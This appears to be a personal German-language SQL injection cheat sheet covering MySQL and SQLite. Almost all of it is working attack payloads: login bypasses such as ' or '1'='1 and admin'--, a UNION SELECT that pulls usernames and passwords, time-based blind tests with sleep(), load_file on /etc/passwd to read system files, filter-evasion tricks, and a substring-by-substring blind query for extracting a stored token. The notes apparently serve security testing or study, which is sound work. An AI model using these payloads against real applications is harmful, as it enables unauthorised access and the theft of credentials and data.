Hauptsächlich mysql
select load_file("/etc/passwd")
BEI SELECT
'						gibt fehlermeldung wenn "or die(mysql_error);"
' or '1'='1 			SELECT id FROM login WHERE username = '' or '1'='1' and password = ''  AND-Bedingung muss passen. Gibt 0 records zurück. 
																							   Bei user und pw eingeben -> returned alle oder admin' or '1'='1
' or '1'='1'-- 			WHERE username = '' or '1'='1'-- ' and password = ''   		     	   gibt alle zurück			
' union all Select 1;-- 	SELECT id FROM login WHERE username = '' union all Select(1);-- ' and password = '' gibt 1 zurück
' or sleep(4); -- 		
' order by 20-- 		Unknown column '20' in 'order clause'
admin'-- 				funktioniert; username muss stimmmen
F' 'OO					


BEI INSERT
' or sleep(4) or '	    bei String
16 and sleep(3)         bei Zahl
123+1
-123
floor(1.5)

Ideen:
Suche mit like: %pattern% -> % zu viel gibt fehler
numeric: 1+1 oder 3-1, 67-ASCII('A') oder wenn single quotes escaped werden: 51-ASCII(1) (beide ergeben 2)
CHAR(50) = 2
Wiley' UNION SELECT username,password FROM users--
/*test*/ macht kommentar (nicht innerhalb eines strings, innerhlab eines commands)

" nicht vergessen

mysql_real_escape_string schützt nicht, wenn input eine zahl ist!!  weil 1 AND 1=2 kein ' escaped

Encoding curl
via GET:
- in -G --data "key=value" ging es nur mit encoding also --data-urlencode
via POST 
- in --data "key=value" ging es mit und ohne encoding


https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/


burp
https://github.com/Snifer/security-cheatsheets/blob/master/burp


sqlite3
kein sleep
auch keine stacked queries
subselect und ;--  gehen ganz normal
cool: wenn zahlen als string in der DB gespeichert werden:
    "1"+"2" macht "3" in der DB
Concatenation "2"||"5" macht "25" in der DB
if: select case when 'a' ='b' then 'aa' else 'bb' end;

(halbwegs) blind brute forcen
(select case when (select substr((select token from tokan limit 1,2), 2,1)) ='2' then '1' else '0' end));-- 
